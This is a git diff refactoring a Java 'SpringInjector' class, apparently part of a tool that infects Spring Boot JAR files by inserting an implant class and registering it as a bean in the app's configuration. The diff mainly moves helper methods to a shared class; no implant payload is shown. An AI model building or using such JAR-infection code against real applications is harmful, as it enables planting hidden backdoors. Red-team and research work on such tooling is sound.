@@ -13,6 +13,8 @@ import java.nio.file.Path;
 import java.util.*;
 import java.util.jar.JarEntry;
 
+import static org.example.injector.Helpers.*;
+
 public class SpringInjector {
     private final Class<?> implantComponentClass;
     private final Class<?> implantSpringConfigClass;
@@ -87,7 +89,7 @@ public class SpringInjector {
                     String targetPackageName = parsePackageNameFromFqcn(currentlyProcessing.getName());
                     String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
                     implantComponent.setName(targetPackageName + "." + implantComponentClassName);
-                    JarEntry newJarEntry = convertToJarEntry(implantComponent);
+                    JarEntry newJarEntry = convertToSpringJarEntry(implantComponent);
                     implantComponent.write(fiddler.addNewEntry(newJarEntry));
                     System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
 
@@ -121,27 +123,6 @@ public class SpringInjector {
         }
 
         return didInfect;
-    }
-
-    private static String parsePackageNameFromFqcn(final String fqcn) {
-        String[] parts = fqcn.split("\\.");
-        if (parts.length < 2) {
-            throw new RuntimeException("Not a fully qualified class name: " + fqcn);
-        }
-        String[] packageParts = Arrays.copyOfRange(parts, 0, parts.length - 1);
-        return String.join(".", packageParts);
-    }
-
-    private static String parseClassNameFromFqcn(final String fqcn) {
-        String[] parts = fqcn.split("\\.");
-        if (parts.length < 2) {
-            throw new RuntimeException("Not a fully qualified class name: " + fqcn);
-        }
-        return parts[parts.length - 1];
-    }
-
-    private static String convertToClassFormatFqcn(final String dotFormatClassName) {
-        return dotFormatClassName.replace(".", "/");
     }
 
     private boolean addBeanToSpringConfig(ClassFile existingSpringConfig, ClassFile implantComponent) throws IOException, ClassNotFoundException {
@@ -207,12 +188,6 @@ public class SpringInjector {
         }
 
         target.addAttribute(targetAnnotationsAttr);
-    }
-
-    private static JarEntry convertToJarEntry(final ClassFile classFile) {
-        // TODO Maybe this "BOOT-INF" etc is not a good thing to hardcode? Versioned JARs? Discrepancies in Spring JAR structure?
-        String fullPathInsideJar = "BOOT-INF/classes/" + classFile.getName().replace(".", "/") + ".class";
-        return new JarEntry(fullPathInsideJar);
     }
 
     private static boolean isSpringConfigurationClass(final ClassFile classFile) {
